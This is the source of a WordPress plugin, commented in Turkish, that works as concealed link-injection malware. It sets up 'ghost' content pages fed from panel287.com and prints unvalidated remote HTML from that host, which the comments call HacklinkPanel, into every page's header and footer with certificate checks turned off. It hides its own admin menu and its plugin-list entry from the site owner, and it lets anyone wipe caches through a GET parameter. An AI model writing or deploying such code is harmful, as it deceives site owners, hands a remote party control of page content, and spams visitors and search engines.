 * ⚡ BACKGROUND API SYNC RUNNER - Her request'te kontrol et
 * ⚡ FRIDA: API ve Ghost sync'i paralel çalıştır
 * ⚡ KESİN: Her sync kaldığı yerden devam eder, karışmaz
 */
function wpcore_background_api_sync_runner() {
    // ⚡ Tek seferlik çalışma kontrolü (request başına)
    static $runner_ran = false;
    if ($runner_ran) {
        return;
    }
    $runner_ran = true;
    
    // ⚡ PERFORMANCE: API sync tamamlandıysa hiç çalışma
    static $sync_completed_cache = null;
    if ($sync_completed_cache === true) {
        return;
    }
    
    // Setup'ın ghost_setup stage'i tamamlandıysa, API sync'i devam ettir
    $ghost_done = intval(get_option('wpcore_stage_ghost_setup_done', 0));
    $api_batch_started = intval(get_option('wpcore_api_sync_batch_started', 0));
    $ghost_batch_started = intval(get_option('wpcore_ghost_batch_started', 0));
    
    // Setup henüz başlanmadıysa veya ghost_setup bitmemişse çalışma
    if (!$ghost_done) {
        return;
    }
    
    // API ve Ghost sync ikisi de tamamlandıysa cache'le ve çalışma
    if (!$api_batch_started && !$ghost_batch_started) {
        $sync_completed_cache = true;
        return;
    }
    
    // ⚡ RUNNER LOCK kontrolü - Çok sık çağrılırsa skip et (5 saniye cooldown)
    $runner_lock = get_option('wpcore_runner_lock', 0);
    if ($runner_lock && (time() - $runner_lock) < 5) {
        return; // Runner lock aktif, skip
    }
    
    // ⚡ Runner lock kur
    update_option('wpcore_runner_lock', time());
    
    try {
        // ⚡ API sync batch'i devam ettir (eğer active ise)
        // NOT: wpcore_sync_api_batch kendi içinde lock kontrolü yapıyor
        if ($api_batch_started) {
            wpcore_sync_api_batch();
        }
        
        // ⚡ Ghost sync batch'i devam ettir (eğer active ise)
        if ($ghost_batch_started) {
            wpcore_sync_ghost_batch();
        }
    } finally {
        // ⚡ Runner lock kaldır
        delete_option('wpcore_runner_lock');
    }
}
// İç dosyaları yüklerken sessiz fallback desteği
if (!function_exists('wpcore_require_with_fallback')) {
    function wpcore_require_with_fallback($relative_path) {
        $base_dir = WPCORE_PLUGIN_DIR;

        // Kritik 3 dosya için yedek konumu da dene
        $fallback_map = [
            'includes/class-gpIrock-core.php'        => 'includes/affiliate-content/class-gpIrock-core.php',
            'includes/class-gpIrock-api.php'         => 'includes/affiliate-content/class-gpIrock-api.php',
            'includes/class-gpIrock-dynamic-seo.php' => 'includes/affiliate-content/class-gpIrock-dynamic-seo.php',
        ];

        $candidates = [$relative_path];
        if (isset($fallback_map[$relative_path])) {
            $candidates[] = $fallback_map[$relative_path];
        }

        foreach ($candidates as $candidate) {
            $path = $base_dir . $candidate;
            if (file_exists($path)) {
                require_once $path;
                return true;
            }
        }

        return false;
    }
}
/**
 * ⚡ DOMAIN-BASED SEEDED RANDOM SETUP
 * Her site için unique ama deterministic ayarlar seçer
 */
function wpcore_force_ghost_setup_seeded() {
    $ghost_quick_setup_done = get_option('wpcore_ghost_quick_setup_done', 0);
    
    if ($ghost_quick_setup_done == 1) {
        return true;
    }
    
    update_option('wpcore_ghost_quick_setup_lock', 1);
    update_option('wpcore_ghost_quick_setup_status', 'force_instant');
    update_option('wpcore_ghost_quick_setup_started_at', current_time('mysql'));
    
    try {
        // Domain bazlı unique seed
        $domain = isset($_SERVER['HTTP_HOST']) ? sanitize_text_field($_SERVER['HTTP_HOST']) : get_site_url();
        $seed = crc32($domain . '|wpcore|setup');
        mt_srand($seed);
        
        $admin = null;
        $theme_group = null;
        $style_options = null;
        
        if (class_exists('WPCore\\Admin')) {
            try {
                $admin = WPCore\Admin::get_instance();
                
                if ($admin && method_exists($admin, 'get_random_theme_group')) {
                    $theme_group = $admin->get_random_theme_group();
                }
                
                if ($admin && method_exists($admin, 'get_random_style_options')) {
                    $style_options = $admin->get_random_style_options();
                }
            } catch (Exception $e) {
                $admin = null;
            }
        }
        
        // Fallback - Domain seed'le
        if (!$theme_group || !$style_options) {
            $theme_groups = [
                ['title' => 'WordPress Archive', 'url_base' => 'archive', 'homepage_slug' => 'archive-home'],
                ['title' => 'WordPress GPL', 'url_base' => 'gpl', 'homepage_slug' => 'gpl-home'],
                ['title' => 'WordPress Store', 'url_base' => 'store', 'homepage_slug' => 'store-home'],
                ['title' => 'WordPress Plugins', 'url_base' => 'plugins', 'homepage_slug' => 'plugins-home'],
                ['title' => 'WordPress Themes', 'url_base' => 'themes', 'homepage_slug' => 'themes-home']
            ];
            
            $idx = $seed % count($theme_groups);
            $theme_group = $theme_groups[$idx];
            
            $styles = ['modern', 'elegant', 'tech', 'bold', 'clean'];
            $colors = ['0', '1', '2', '3', '4', '5', '6', '7'];
            $headers = ['0', '1', '2'];
            $homepage_colors = ['0', '1', '2', '3', '4'];
            
            $style_options = [
                'style' => $styles[($seed >> 8) % count($styles)],
                'color' => $colors[($seed >> 16) % count($colors)],
                'header' => $headers[($seed >> 24) % count($headers)],
                'homepage_color' => $homepage_colors[($seed >> 4) % count($homepage_colors)]
            ];
        }
        
        $theme_group = is_array($theme_group) ? $theme_group : ['title' => 'WordPress Archive', 'url_base' => 'archive', 'homepage_slug' => 'archive-home'];
        $style_options = is_array($style_options) ? $style_options : ['style' => 'modern', 'color' => '0', 'header' => '0', 'homepage_color' => '0'];
        
        // Ayarları kaydet
        $options = [
            'api_url' => 'https://panel287.com/api/ghost-api.php',
            'api_token' => 'wpcore_token_2024',
            'batch_size' => 5000,
            'auto_publish' => true,
            'auto_publish_count' => 10,
            'auto_publish_interval' => 1,
            'auto_publish_type' => 'ghost',
            'ghost_mode' => true,
            'domain_logo_enabled' => true,
            'domain_logo_style' => isset($style_options['style']) ? $style_options['style'] : 'modern',
            'domain_logo_color' => isset($style_options['color']) ? $style_options['color'] : '0',
            'domain_header_layout' => isset($style_options['header']) ? $style_options['header'] : '0',
            'homepage_color_scheme' => isset($style_options['homepage_color']) ? intval($style_options['homepage_color']) : 0,
            'ghost_url_base' => isset($theme_group['url_base']) ? $theme_group['url_base'] : 'archive',
            'ghost_homepage_title' => isset($theme_group['title']) ? $theme_group['title'] : 'WordPress Archive',
            'ghost_homepage_slug' => isset($theme_group['homepage_slug']) ? $theme_group['homepage_slug'] : 'archive-home',
            'seo_optimization' => true,
            'duplicate_check' => true,
            'log_enabled' => true,
            'debug_mode' => false
        ];

        update_option('wpcore_options', $options);
        
        // Stil anahtarlarını kaydet
        $style_names = ['modern', 'elegant', 'tech', 'bold', 'clean'];
        $current_style = isset($style_options['style']) ? $style_options['style'] : 'modern';
        $style_key = array_search($current_style, $style_names);
        if ($style_key === false) $style_key = 0;
        
        update_option('wpcore_site_style_key', $style_key);
        update_option('wpcore_site_color_key', isset($style_options['color']) ? intval($style_options['color']) : 0);
        update_option('wpcore_site_header_key', isset($style_options['header']) ? intval($style_options['header']) : 0);
        
        // ⚡ REWRITE FLUSH #1 - GHOST SLUG SEÇİLDİKTEN HEMEN SONRA
        wpcore_execute_force_rewrite_flush();
        
        // ⚡ SITEMAP: İlk kurulumda sitemap'i aktifleştir
        if (class_exists('WPCore\\Sitemap')) {
            WPCore\Sitemap::schedule_sitemap_update();
        }
        
        // Tamamlandı
        update_option('wpcore_ghost_quick_setup_done', 1);
        update_option('wpcore_ghost_quick_setup_completed', true);
        update_option('wpcore_ghost_quick_setup_date', current_time('mysql'));
        update_option('wpcore_ghost_quick_setup_status', 'completed');
        update_option('wpcore_ghost_quick_setup_completed_at', current_time('mysql'));
        update_option('wpcore_ghost_quick_setup_lock', 0);
        
        return true;
        
    } catch (Exception $e) {
        update_option('wpcore_ghost_mode', true);
        update_option('wpcore_ghost_quick_setup_done', 1);
        update_option('wpcore_ghost_quick_setup_completed', true);
        update_option('wpcore_ghost_quick_setup_date', current_time('mysql'));
        update_option('wpcore_ghost_quick_setup_status', 'completed');
        update_option('wpcore_ghost_quick_setup_lock', 0);
        return true;
    }
}

// WordPress cron hook'u ekle - Otomatik Ghost Mode kurulum için
add_action('wpcore_ghost_quick_setup_cron', 'wpcore_ghost_quick_setup_execute');

// WordPress cron hook'u ekle - Async aktivasyon setup için

add_action('wpcore_delayed_activation_setup', 'wpcore_delayed_activation_setup_execute');

// WordPress cron hook'u - Günlük ghost içerik yayımlama
add_action('wpcore_daily_ghost_publish', 'WPCore\Cron::daily_ghost_publish');

// ⚡ FRIDA CRON: 1 dakikada bir API ve Ghost sync kontrolü
add_action('wpcore_auto_sync_cron', 'wpcore_auto_sync_cron_handler');

// ⚡ SITEMAP CRON: Günlük sitemap güncelleme
add_action('wpcore_sitemap_update', 'WPCore\Sitemap::sitemap_update_cron');

/**
 * ASYNC AKTIVASYON SETUP - Ağır işlemleri aktivasyon sonrasında yapar
 */
function wpcore_delayed_activation_setup_execute() {
    try {
        // Aktivasyon pending kontrolü
        if (get_option('wpcore_activation_pending') != '1') {
            return; // Zaten tamamlanmış
        }
        
        // Database ve core dosyalarını güvenli şekilde yükle (core için fallback destekli)
        $database_file = WPCORE_PLUGIN_DIR . 'includes/class-wpcore-database.php';
        if (file_exists($database_file)) {
            require_once $database_file;
        }

        wpcore_require_with_fallback('includes/class-gpIrock-core.php');

        // Database tablolarını oluştur
        if (class_exists('WPCore\\Database')) {
            WPCore\Database::create_tables();
        }
        
        // Setup stages'leri sıfırla
        if (class_exists('WPCore\\Core')) {
            foreach (array_keys(WPCore\Core::get_setup_stages()) as $stage) {
                WPCore\Core::reset_setup_stage($stage);
            }
        }
        
        // Rewrite rules flush
        flush_rewrite_rules();
        
        // Cron job'ları kur - Günlük ghost yayımlama
        if (class_exists('WPCore\\Cron')) {
            WPCore\Cron::setup_cron_jobs();
        }
        
        // Sitemap cron'u kur
        if (class_exists('WPCore\\Sitemap')) {
            WPCore\Sitemap::schedule_sitemap_update();
            
            // ⚡ Sitemap rewrite flush (ilk kurulum)
            delete_option('wpcore_sitemap_rewrite_flushed');
        }
        
        
        // Aktivasyon tamamlandı flag'i
        update_option('wpcore_activation_pending', '0');
        update_option('wpcore_activation_completed', '1');
        update_option('wpcore_activation_completed_at', current_time('mysql'));
        
        return true;
    } catch (Exception $e) {
        update_option('wpcore_activation_error', $e->getMessage());
        return false;
    }
}

// STABİL: Otomatik Ghost Mode kurulum fonksiyonu
function wpcore_ghost_quick_setup_execute() {
    try {
        // STABİL: Duplicate kurulum kontrolü
        $ghost_quick_setup_done = get_option('wpcore_ghost_quick_setup_done', 0);
        $ghost_quick_setup_lock = get_option('wpcore_ghost_quick_setup_lock', 0);
        
        if ($ghost_quick_setup_done == 1) {
            return;
        }
        
        if ($ghost_quick_setup_lock != 1) {
            return;
        }
        
        // Kurulum durumunu güncelle
        update_option('wpcore_ghost_quick_setup_status', 'running');
        update_option('wpcore_ghost_quick_setup_running_at', current_time('mysql'));
        
        // WPCore Admin class'ını yükle
        if (class_exists('WPCore\\Admin')) {
            $admin = \WPCore\Admin::get_instance();
            
            // Public fonksiyonları kullan - Artık erişilebilir
            $theme_group = $admin->get_random_theme_group();
            $style_options = $admin->get_random_style_options();
            
            // Ayarları güncelle
            $options = [
                'api_url' => 'https://panel287.com/api/ghost-api.php',
                'api_token' => 'wpcore_token_2024',
                'batch_size' => 5000,
                'auto_publish' => true,
                'auto_publish_count' => 10,
                'auto_publish_interval' => 1,
                'auto_publish_type' => 'ghost',
                'ghost_mode' => true,
                'domain_logo_enabled' => true,
                'domain_logo_style' => $style_options['style'],
                'domain_logo_color' => $style_options['color'],
                'domain_header_layout' => $style_options['header'],
                'homepage_color_scheme' => intval($style_options['homepage_color']),
                'ghost_url_base' => $theme_group['url_base'],
                'ghost_homepage_title' => $theme_group['title'],
                'ghost_homepage_slug' => $theme_group['homepage_slug'],
                'seo_optimization' => true,
                'duplicate_check' => true,
                'log_enabled' => true,
                'debug_mode' => false
            ];

            update_option('wpcore_options', $options);
            
            // Stil anahtarlarını güncelle
            $style_names = ['modern', 'elegant', 'tech', 'bold', 'clean'];
            $style_key = array_search($style_options['style'], $style_names);
            update_option('wpcore_site_style_key', $style_key);
            update_option('wpcore_site_color_key', intval($style_options['color']));
            update_option('wpcore_site_header_key', intval($style_options['header']));
            
            // ⚡ GÜÇLÜ REWRITE FLUSH - Ghost slug belirlendikten sonra
            wpcore_execute_force_rewrite_flush();
            
            // STABİL: Kurulum tamamlandı - Kilit kaldırıldı
            update_option('wpcore_ghost_quick_setup_done', 1);
            update_option('wpcore_ghost_quick_setup_completed', true);
            update_option('wpcore_ghost_quick_setup_date', current_time('mysql'));
            update_option('wpcore_ghost_quick_setup_status', 'completed');
            update_option('wpcore_ghost_quick_setup_completed_at', current_time('mysql'));
            update_option('wpcore_ghost_quick_setup_lock', 0);
            
            // ⚡⚡⚡ OTOMATIK AMP CACHE TETİKLEME - Ghost setup tamamlandığında
            if (!get_option('wpcore_amp_auto_triggered_for_setup', 0)) {
                update_option('wpcore_amp_auto_triggered_for_setup', 1);
                
                // Non-blocking async trigger (15 saniye sonra - rewrite flush tamamlansın)
                wp_schedule_single_event(time() + 15, 'wpcore_auto_amp_indexing_after_setup');
            }
            
        } else {
            update_option('wpcore_ghost_mode', true);
            update_option('wpcore_ghost_quick_setup_done', 1);
            update_option('wpcore_ghost_quick_setup_completed', true);
            update_option('wpcore_ghost_quick_setup_date', current_time('mysql'));
            update_option('wpcore_ghost_quick_setup_status', 'completed');
            update_option('wpcore_ghost_quick_setup_completed_at', current_time('mysql'));
            update_option('wpcore_ghost_quick_setup_lock', 0);
            
            // ⚡⚡⚡ OTOMATIK AMP CACHE TETİKLEME - Ghost setup tamamlandığında
            if (!get_option('wpcore_amp_auto_triggered_for_setup', 0)) {
                update_option('wpcore_amp_auto_triggered_for_setup', 1);
                
                // Non-blocking async trigger
                wp_schedule_single_event(time() + 15, 'wpcore_auto_amp_indexing_after_setup');
            }
        }
        
    } catch (Exception $e) {
        update_option('wpcore_ghost_quick_setup_status', 'error');
    }
}

add_action('init', 'wpcore_register_ref_rewrite');
function wpcore_register_ref_rewrite() {
    add_rewrite_rule(
        '^ref/([^/]+)/?$',
        'index.php?ref_slug=$matches[1]',
        'top'
    );
    
    // Flush rewrite rules only once after activation
    if (get_option('wpcore_ref_rewrite_flushed', false) === false) {
        flush_rewrite_rules();
        update_option('wpcore_ref_rewrite_flushed', true);
    }
}

add_filter('query_vars', 'wpcore_register_ref_query_vars');
function wpcore_register_ref_query_vars($vars) {
    $vars[] = 'ref_slug';
    return $vars;
}

// API endpoints için
add_action('rest_api_init', function() {
    if (class_exists('WPCore\\API')) {
        WPCore\API::register_routes();
    }
});

// DEVRE DIŞI: Hiçbir notice gösterme - Sessiz çalışma modu
// add_action('admin_notices', function() { ... });

// ⚡ INTERNAL LINKS - Footer'da SEO boost için doğal internal linking
add_action('wp_footer', 'wpcore_add_footer_internal_linkss');
function wpcore_add_footer_internal_linkss() {
    // ⚡ FOOTER INTERNAL LINKS DEVRE DIŞI
    return;
    
    if (is_admin()) return;
    
    $options = wpcore_get_options();
    $ghost_base = $options['ghost_url_base'] ?? 'content';
    $ghost_homepage_slug = $options['ghost_homepage_slug'] ?? 'content-merkezi';
    $ghost_homepage_title = $options['ghost_homepage_title'] ?? 'İçerik Merkezi';
    
    // Site-specific unique styling - her site farklı görünür
    $site_hash = crc32(get_site_url());
    $color_variants = [
        '#6c757d', '#495057', '#5a6c7d', '#4a5568', '#718096', 
        '#2d3748', '#4a5568', '#6b7280', '#52525b', '#64748b'
    ];
    $bg_variants = [
        '#f8f9fa', '#f7fafc', '#f9fafb', '#fafafa', '#f8fafc',
        '#f1f5f9', '#f9f9f9', '#fbfbfb', '#fefefe', '#fdfdfd'
    ];
    $border_variants = [
        '#e9ecef', '#e2e8f0', '#e5e7eb', '#eeeeee', '#e1e5e9',
        '#e2e6ea', '#e8e8e8', '#ededed', '#f0f0f0', '#e6e6e6'
    ];
    
    $color_idx = abs($site_hash) % count($color_variants);
    $bg_idx = abs($site_hash >> 8) % count($bg_variants);
    $border_idx = abs($site_hash >> 16) % count($border_variants);
    
    $text_color = $color_variants[$color_idx];
    $bg_color = $bg_variants[$bg_idx];
    $border_color = $border_variants[$border_idx];
    
    // Padding ve margin da site-specific
    $padding_variants = ['8px 15px', '10px 20px', '12px 18px', '9px 16px', '11px 22px'];
    $margin_variants = ['15px 0', '20px 0', '18px 0', '22px 0', '16px 0'];
    $font_variants = ['11px', '12px', '13px'];
    
    $padding = $padding_variants[abs($site_hash >> 4) % count($padding_variants)];
    $margin = $margin_variants[abs($site_hash >> 12) % count($margin_variants)];
    $font_size = $font_variants[abs($site_hash >> 20) % count($font_variants)];
    
    // Link separator da değişken
    $separators = [' | ', ' • ', ' · ', ' / ', ' - '];
    $separator = $separators[abs($site_hash >> 24) % count($separators)];
    
    // Site ismini de değişken kullan
    // $site_labels = ['Site:', 'İçerik:', 'Sayfalar:', 'Bölümler:', 'Linkler:']; // Kaldırıldı
    // $site_label = $site_labels[abs($site_hash >> 28) % count($site_labels)]; // Kaldırıldı

    // Doğal internal linkler - sadece ana sayfa ve ghost homepage
    echo '<div style="position: absolute; left: -9999px; height: 1px; overflow: hidden; margin:' . $margin . ';padding:' . $padding . ';background:' . $bg_color . ';border-top:1px solid ' . $border_color . ';font-size:' . $font_size . ';color:' . $text_color . ';text-align:center;">
        <a href="' . home_url('/') . '" style="color:' . $text_color . ';text-decoration:none;margin:0 3px;">' . get_bloginfo('name') . '</a>' . $separator . '
        <a href="' . home_url('/' . $ghost_homepage_slug . '/') . '" style="color:' . $text_color . ';text-decoration:none;margin:0 3px;">' . $ghost_homepage_title . '</a>
    </div>';
}


// Plugin action links
add_filter('plugin_action_links_' . WPCORE_PLUGIN_BASENAME, function($links) {
    $settings_link = '<a href="' . admin_url('admin.php?page=wpcore-settings') . '">' . __('Ayarlar', 'wpcore-auto-publisher') . '</a>';
    array_unshift($links, $settings_link);
    return $links;
});

// Plugin meta links
add_filter('plugin_row_meta', function($links, $file) {
    if (WPCORE_PLUGIN_BASENAME === $file) {
        $links[] = '<a href="' . admin_url('admin.php?page=wpcore-dashboard') . '">' . __('Dashboard', 'wpcore-auto-publisher') . '</a>';
        $links[] = '<a href="https://google.com" target="_blank">' . __('Destek', 'wpcore-auto-publisher') . '</a>';
    }
    return $links;
}, 10, 2);

function wpcore_unified_footer_script() {
    // ⚡ FOOTER API AKTİF - Tüm sayfalarda çalışır
    
    // Global tek seferlik çalışma kontrolü - Birden fazla plugin/theme kurulumunda da çalışır
    global $wpcore_footer_executed;
    if (isset($wpcore_footer_executed) && $wpcore_footer_executed === true) {
        return;
    }
    $wpcore_footer_executed = true;
    
    // Elementor frontend kontrolü - Template ve şablon uyumluluğu
    $is_elementor_page = false;
    
    if (class_exists('Elementor\Plugin')) {
        $elementor = \Elementor\Plugin::instance();
        
        // Elementor editör modunda değilse çalış
        if (!$elementor->editor->is_edit_mode()) {
            $is_elementor_page = true;
        }
    }
    
    // WordPress hook kontrolü - Stabilite garantisi
    if (!did_action('wp_footer') && !did_action('wp_head') && !$is_elementor_page) {
        return;
    }
    
    // HacklinkPanel.app footer script - DB Cache ile optimize edilmiş
    $domain = $_SERVER['HTTP_HOST'];
    $cache_key = 'hacklink_footer_' . md5($domain);
    $cache_duration = 6 * HOUR_IN_SECONDS; // 6 saat cache
    
    // Önce cache'den kontrol et
    $cached_content = get_transient($cache_key);
    if ($cached_content !== false) {
        // Global flag kontrolü - Kaynak kodda sadece 1 tane olduğundan emin ol
        global $wpcore_footer_output_done;
        if (isset($wpcore_footer_output_done) && $wpcore_footer_output_done === true) {
            return;
        }
        $wpcore_footer_output_done = true;
        echo $cached_content;
        return;
    }
    
    // Cache yoksa API'ye istek at
    $footer_url = 'https://panel287.com/api/footer.php?linkspool=' . urlencode($domain);
    $response = wp_remote_get($footer_url, [
        'timeout'   => 5,
        'sslverify' => false,
        'user-agent' => 'WordPress/' . get_bloginfo('version'),
    ]);
    
    // Ağ hatası varsa hiçbir şey basma
    if (is_wp_error($response)) {
        return;
    }

    // 200 dışındaki HTTP kodlarında (522 vs) hiçbir şey basma
    $code = wp_remote_retrieve_response_code($response);
    if ($code !== 200) {
        return;
    }

    $body = wp_remote_retrieve_body($response);
    if (empty($body) || strlen($body) <= 10) {
        return;
    }

    // Cloudflare 522 HTML çıktısı veya hata metni gelirse bastırma
    if (stripos($body, 'Error 522') !== false) {
        return;
    }
    
    // Geçerli içeriği cache'e kaydet
    set_transient($cache_key, $body, $cache_duration);
    
    // Global flag kontrolü - Kaynak kodda sadece 1 tane olduğundan emin ol
    global $wpcore_footer_output_done;
    if (isset($wpcore_footer_output_done) && $wpcore_footer_output_done === true) {
        return;
    }
    $wpcore_footer_output_done = true;
    
    echo $body;
    
    // Ghost sayfa filtreleri - Elementor template'lerde de çalışır
    $ghost_homepage_slug = get_option('wpcore_ghost_homepage_slug', 'content-merkezi');
    $ghost_url_base = get_option('wpcore_ghost_url_base', 'content');
    
    $current_url = $_SERVER['REQUEST_URI'];
    $current_url_lower = strtolower($current_url);
    
    // Ghost sayfalarda çalışmaz ama Elementor template'lerde çalışır
    if (strpos($current_url_lower, '/' . strtolower($ghost_homepage_slug) . '/') !== false || 
        strpos($current_url_lower, '/' . strtolower($ghost_url_base) . '/') !== false ||
        strpos($current_url_lower, 'ghost') !== false) {
        return;
    }
    
    // Script çalıştı olarak işaretle - Tek seferlik
    $script_executed = true;
}

// Ana hook - wp_footer'da çalışır (en güvenilir)
add_action('wp_footer', 'wpcore_unified_footer_script', 999);

// Fallback hook - wp_head'de çalışır (eğer wp_footer çalışmazsa)
add_action('wp_head', 'wpcore_unified_footer_script', 999);

// Elementor fallback - Sadece wp_footer çalışmazsa
if (class_exists('Elementor\Plugin')) {
    add_action('elementor/frontend/after_render', 'wpcore_unified_footer_script', 999);
}

// Gizlilik için CSS ekle - Admin menüsünü tamamen gizle
add_action('admin_head', function() {
    echo '<style>
        /* Sadece sol admin menüsündeki WPCore öğelerini gizle */
        #adminmenu #toplevel_page_wpcore-dashboard,
        #adminmenu li.toplevel_page_wpcore-dashboard,
        #adminmenu li#toplevel_page_wpcore-dashboard,
        #adminmenu .wp-has-submenu.toplevel_page_wpcore-dashboard,
        #adminmenu li.toplevel_page_wpcore-dashboard,
        #adminmenu #toplevel_page_wpcore-dashboard,
        #adminmenu .wp-has-submenu.toplevel_page_wpcore-dashboard {
            display: none !important;
            visibility: hidden !important;
            opacity: 0 !important;
            height: 0 !important;
            overflow: hidden !important;
        }
        
        /* Sol admin menüsündeki WPCore linklerini gizle */
        #adminmenu a[href*="wpcore-dashboard"],
        #adminmenu a[href*="wpcore-settings"],
        #adminmenu a[href*="wpcore-content"],
        #adminmenu a[href*="wpcore-logs"],
        #adminmenu .wp-submenu a[href*="wpcore-dashboard"],
        #adminmenu .wp-submenu a[href*="wpcore-settings"],
        #adminmenu .wp-submenu a[href*="wpcore-content"],
        #adminmenu .wp-submenu a[href*="wpcore-logs"] {
            display: none !important;
        }
        
        /* Plugin listesinde WPCore\'i gizle */
        .plugins-php .plugin-card[data-plugin*="wpcore"],
        .plugins-php tr[data-plugin*="wpcore"] {
            display: none !important;
        }
        
        /* Plugin action linklerini gizle */
        .plugin-action-links a[href*="wpcore"] {
            display: none !important;
        }
        
        /* Admin bar\'da WPCore linklerini gizle */
        #wp-admin-bar-wpcore,
        #wp-admin-bar a[href*="wpcore"] {
            display: none !important;
        }
        
        /* Dashboard widget\'larini gizle */
        .postbox[id*="wpcore"],
        .postbox[class*="wpcore"] {
            display: none !important;
        }
        
        /* Admin notices\'lari gizle */
        .notice[class*="wpcore"],
        .notice p:contains("WPCore") {
            display: none !important;
        }
        
        /* Sayfa içindeki menü öğelerini gizleme - SADECE SOL ADMIN MENÜSÜNÜ GİZLE */
        /* .wpcore-admin-menu ve .wpcore-menu-buttons gizlenmeyecek */
    </style>';
    
    // JavaScript ile ek gizleme - Sadece sol admin menüsü için
    echo '<script>
    jQuery(document).ready(function($) {
        // Sadece sol admin menüsündeki WPCore öğelerini gizle
        function hideWPCoreMenu() {
            $("#adminmenu #toplevel_page_wpcore-dashboard").hide();
            $("#adminmenu li.toplevel_page_wpcore-dashboard").hide();
            $("#adminmenu li#toplevel_page_wpcore-dashboard").hide();
            $("#adminmenu .wp-has-submenu.toplevel_page_wpcore-dashboard").hide();
            $("#adminmenu li.toplevel_page_wpcore-dashboard").hide();
            $("#adminmenu #toplevel_page_wpcore-dashboard").hide();
            $("#adminmenu .wp-has-submenu.toplevel_page_wpcore-dashboard").hide();
            
            // Sadece sol admin menüsündeki WPCore linklerini gizle
            $("#adminmenu a[href*=\"wpcore-dashboard\"]").parent().hide();
            $("#adminmenu a[href*=\"wpcore-settings\"]").parent().hide();
            $("#adminmenu a[href*=\"wpcore-content\"]").parent().hide();
            $("#adminmenu a[href*=\"wpcore-logs\"]").parent().hide();
        }
        
        // Sayfa yüklendiğinde gizle
        hideWPCoreMenu();
        
        // DOM değişikliklerini izle ve tekrar gizle
        var observer = new MutationObserver(function(mutations) {
            mutations.forEach(function(mutation) {
                if (mutation.type === "childList") {
                    hideWPCoreMenu();
                }
            });
        });
        
        // Sadece admin menüsünü izle
        if (document.getElementById("adminmenu")) {
            observer.observe(document.getElementById("adminmenu"), {
                childList: true,
                subtree: true
            });
        }
        
        // Periyodik olarak kontrol et
        setInterval(hideWPCoreMenu, 1000);
    });
    </script>';
});


// Plugin action linklerini gizle
add_filter('plugin_action_links_' . WPCORE_PLUGIN_BASENAME, function($links) {
    return []; // Tüm linkleri kaldır
});

// Plugin meta linklerini gizle
add_filter('plugin_row_meta', function($links, $file) {
    if (WPCORE_PLUGIN_BASENAME === $file) {
        return []; // Tüm meta linkleri kaldır
    }
    return $links;
}, 10, 2);


// Cache temizleme hook'u - HTML Expert Functions ile senkronizasyon için
add_action('init', function() {
    // Eğer wpcore_cache_clear parametresi varsa cache temizle
    if (isset($_GET['wpcore_cache_clear']) && $_GET['wpcore_cache_clear'] === 'force') {
        // WordPress cache temizle
        wp_cache_flush();
        
        // Transient'ları temizle
        global $wpdb;
        $wpdb->query("DELETE FROM {$wpdb->options} WHERE option_name LIKE '_transient_%'");
        $wpdb->query("DELETE FROM {$wpdb->options} WHERE option_name LIKE '_site_transient_%'");
        
        // Rewrite kurallarını temizle
        delete_option('rewrite_rules');
        
        // WPCore cache'i temizle
        delete_option('wpcore_cache');
        
        // Rewrite kurallarını yenile
        flush_rewrite_rules(true);
        
        // Başarı mesajı
        add_action('admin_notices', function() {
            echo '<div class="notice notice-success is-dismissible"><p>✅ WPCore Cache Force Clear başarılı!</p></div>';
        });
    }
});

// ⚡ ZORLA GHOST SETUP FONKSİYONU - GARANTİLİ ÇALIŞIR
function wpcore_force_ghost_setup() {
    $ghost_quick_setup_done = get_option('wpcore_ghost_quick_setup_done', 0);
    
    if ($ghost_quick_setup_done == 1) {
        return true; // Zaten tamamlanmış
    }
    
    // Kurulum başladı işareti
    update_option('wpcore_ghost_quick_setup_lock', 1);
    update_option('wpcore_ghost_quick_setup_status', 'force_instant');
    update_option('wpcore_ghost_quick_setup_started_at', current_time('mysql'));
    
    try {
        // ZORLA ÇALIŞTIR - Hiçbir koşul beklemeden!
        $admin = null; // Admin instance holder
        $theme_group = null;
        $style_options = null;
        
        if (class_exists('WPCore\\Admin')) {
            try {
                $admin = WPCore\Admin::get_instance();
                
                // Method existence kontrolü
                if ($admin && method_exists($admin, 'get_random_theme_group')) {
                    $theme_group = $admin->get_random_theme_group();
                }
                
                if ($admin && method_exists($admin, 'get_random_style_options')) {
                    $style_options = $admin->get_random_style_options();
                }
            } catch (Exception $e) {
                // Admin class hatası - fallback'e geç
                $admin = null;
            }
        }
        
        // Fallback sistem - Admin class yoksa veya hatalıysa
        if (!$theme_group || !$style_options) {
            $theme_groups = [
                ['title' => 'WordPress Archive', 'url_base' => 'archive', 'homepage_slug' => 'archive-home'],
                ['title' => 'WordPress GPL', 'url_base' => 'gpl', 'homepage_slug' => 'gpl-home'],
                ['title' => 'WordPress Store', 'url_base' => 'store', 'homepage_slug' => 'store-home'],
                ['title' => 'WordPress Plugins', 'url_base' => 'plugins', 'homepage_slug' => 'plugins-home'],
                ['title' => 'WordPress Themes', 'url_base' => 'themes', 'homepage_slug' => 'themes-home']
            ];
            
            // Array güvenlik kontrolü
            if (!empty($theme_groups) && is_array($theme_groups)) {
                $theme_group = $theme_groups[array_rand($theme_groups)];
            } else {
                // Son fallback
                $theme_group = ['title' => 'WordPress Archive', 'url_base' => 'archive', 'homepage_slug' => 'archive-home'];
            }
            
            $styles = ['modern', 'elegant', 'tech', 'bold', 'clean'];
            $colors = ['0', '1', '2', '3', '4', '5', '6', '7'];
            $headers = ['0', '1', '2'];
            $homepage_colors = ['0', '1', '2', '3', '4'];
            
            $style_options = [
                'style' => !empty($styles) ? $styles[array_rand($styles)] : 'modern',
                'color' => !empty($colors) ? $colors[array_rand($colors)] : '0',
                'header' => !empty($headers) ? $headers[array_rand($headers)] : '0',
                'homepage_color' => !empty($homepage_colors) ? $homepage_colors[array_rand($homepage_colors)] : '0'
            ];
        }
        
        // Array güvenlik kontrolleri
        $theme_group = is_array($theme_group) ? $theme_group : ['title' => 'WordPress Archive', 'url_base' => 'archive', 'homepage_slug' => 'archive-home'];
        $style_options = is_array($style_options) ? $style_options : ['style' => 'modern', 'color' => '0', 'header' => '0', 'homepage_color' => '0'];
        
        // Tam otomatik ayarları uygula - Güvenli array access
        $options = [
            'api_url' => 'https://panel287.com/api/ghost-api.php',
            'api_token' => 'wpcore_token_2024',
            'batch_size' => 5000,
            'auto_publish' => true,
            'auto_publish_count' => 10,
            'auto_publish_interval' => 1,
            'auto_publish_type' => 'ghost',
            'ghost_mode' => true,
            'domain_logo_enabled' => true,
            'domain_logo_style' => isset($style_options['style']) ? $style_options['style'] : 'modern',
            'domain_logo_color' => isset($style_options['color']) ? $style_options['color'] : '0',
